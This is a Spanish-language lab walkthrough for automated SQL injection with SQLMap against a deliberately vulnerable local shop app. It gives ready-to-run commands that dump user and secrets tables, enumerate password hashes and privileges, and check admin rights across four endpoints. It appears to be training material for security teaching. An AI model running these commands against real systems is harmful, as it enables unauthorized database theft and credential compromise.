# 03 — Explotación automatizada con SQLMap

> Todos los comandos asumen la app vulnerable en `http://localhost:3000`.
> Para el laboratorio: `--batch` (no interactivo), `--flush-session` para repetir limpio.

## 3.1 — Conceptos de agresividad: `--level` y `--risk`

| Opción | Rango | Qué cambia |
|---|---|---|
| `--level` | 1–5 | Cantidad de puntos probados (headers, cookies, etc.) y payloads. Nivel ≥2 prueba Cookie; ≥3 User-Agent/Referer. |
| `--risk` | 1–3 | Agresividad de los payloads. 1=seguro; 2 agrega time-based pesados; 3 agrega `OR`-based (puede modificar datos). |

Estrategia recomendada: empezar con `--level 1 --risk 1` e ir subiendo solo si no detecta.

## 3.2 — Técnicas (`--technique`)
`B`=Boolean blind, `E`=Error-based, `U`=Union, `S`=Stacked, `T`=Time-based, `Q`=inline.
Por defecto SQLMap prueba `BEUSTQ`. Para aislar una técnica concreta usar `--technique=`.

---

## 3.3 — Endpoint 1: Búsqueda (UNION / Error / Boolean) — GET

### Detección
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch
```
### Forzar UNION y volcar
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --technique=U --batch --dbs
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb --tables
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb -T users --dump
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb -T secrets --dump
```

---

## 3.4 — Endpoint 2: Detalle por id (Error-based / Boolean) — GET en path
El parámetro está en la **ruta**; se marca con `*`:
```
sqlmap -u "http://localhost:3000/products/1*" --batch --technique=E --dbs
sqlmap -u "http://localhost:3000/products/1*" --batch --technique=B -D shopdb -T users --dump
```

---

## 3.5 — Endpoint 3: API (Time-based blind) — GET
```
sqlmap -u "http://localhost:3000/api/products?minStock=1" -p minStock \
       --technique=T --batch --current-user --current-db
```

---

## 3.6 — Endpoint 4: Login (POST) — formulario

### Opción A: indicar los datos POST
```
sqlmap -u "http://localhost:3000/login" \
       --data="username=admin&password=x" -p username \
       --batch --level 2 --risk 2 --dbs
```
### Opción B: request guardado de Burp (recomendado)
1. En Burp: *Save item* → `login.req`.
2. `sqlmap -r login.req -p username --batch --dump -D shopdb -T users`

---

## 3.7 — Enumeración completa (una corrida "a fondo")
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch \
       --level 5 --risk 3 \
       --banner --current-user --current-db --is-dba \
       --users --passwords --privileges \
       --dbs
```
- `--is-dba` → indica si el usuario de BD es administrador (en `app-vuln`: **True**).
- `--privileges` → lista privilegios (debería mostrar `FILE`).

---

## 3.8 — Buenas prácticas de la corrida
- `--batch` para repetibilidad; `--flush-session` para empezar de cero.
- `--threads 4` acelera blind; `--delay`/`--time-sec` ajustan time-based.
- Guardar salida: `--output-dir=./evidencias/sqlmap`.
- Documentar en `evidencias/` la salida de cada técnica (U/E/B/T) por separado.

El impacto (volcado completo, archivos, os-shell) se desarrolla en `04-impacto.md`.
